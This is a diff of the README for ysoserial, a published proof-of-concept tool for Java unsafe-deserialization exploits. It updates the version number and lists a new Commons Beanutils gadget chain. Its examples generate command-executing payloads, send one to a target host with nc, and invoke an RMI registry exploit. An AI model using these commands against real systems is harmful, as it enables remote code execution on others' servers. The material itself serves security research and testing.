@@ -7,8 +7,8 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 ## Description
 
-Released as part of AppSecCali 2015 Talk ["Marshalling Pickles: how deserializing objects will ruin your day"](http://frohoff.github.io/appseccali-marshalling-pickles/). 
-Updated to include a [JRE <= 1.7u21 gadget chain](https://gist.github.com/frohoff/24af7913611f8406eaf3).
+Released as part of AppSecCali 2015 Talk ["Marshalling Pickles: how deserializing objects will ruin your day"](http://frohoff.github.io/appseccali-marshalling-pickles/) with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x). 
+Later updated to include additional gadget chains for [JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and [Apache Commons Beanutils](https://gist.github.com/frohoff/9eb8811761ff989b3ac0).
 
 __ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java 
 libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of objects. 
@@ -29,10 +29,11 @@ are not responsible or liable for misuse of the software. Use responsibly.
 ## Usage
 
 ```shell
-$ java -jar ysoserial-0.0.3-all.jar
+$ java -jar target/ysoserial-0.0.4-all.jar
 Y SO SERIAL?
 Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
         Available payload types:
+                CommonsBeanutilsCollectionsLogging1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
                 CommonsCollections1 [commons-collections:commons-collections:3.1]
                 CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
                 CommonsCollections3 [commons-collections:commons-collections:3.1]
@@ -45,7 +46,7 @@ Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute
 ## Examples
 
 ```shell
-$ java -jar ysoserial-0.0.3-all.jar CommonsCollections1 calc.exe | xxd
+$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 calc.exe | xxd
 0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
 0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
 0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
@@ -54,10 +55,10 @@ $ java -jar ysoserial-0.0.3-all.jar CommonsCollections1 calc.exe | xxd
 0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
 0000570: 0078 7071 007e 003a                      .xpq.~.:
        
-$ java -jar ysoserial-0.0.3-all.jar Groovy1 calc.exe > groovypayload.bin
+$ java -jar ysoserial-0.0.4-all.jar Groovy1 calc.exe > groovypayload.bin
 $ nc 10.10.10.10 < groovypayload.bin
 
-$ java -cp ysoserial-0.0.3-all.jar ysoserial.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+$ java -cp ysoserial-0.0.4-all.jar ysoserial.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
 ## Installation
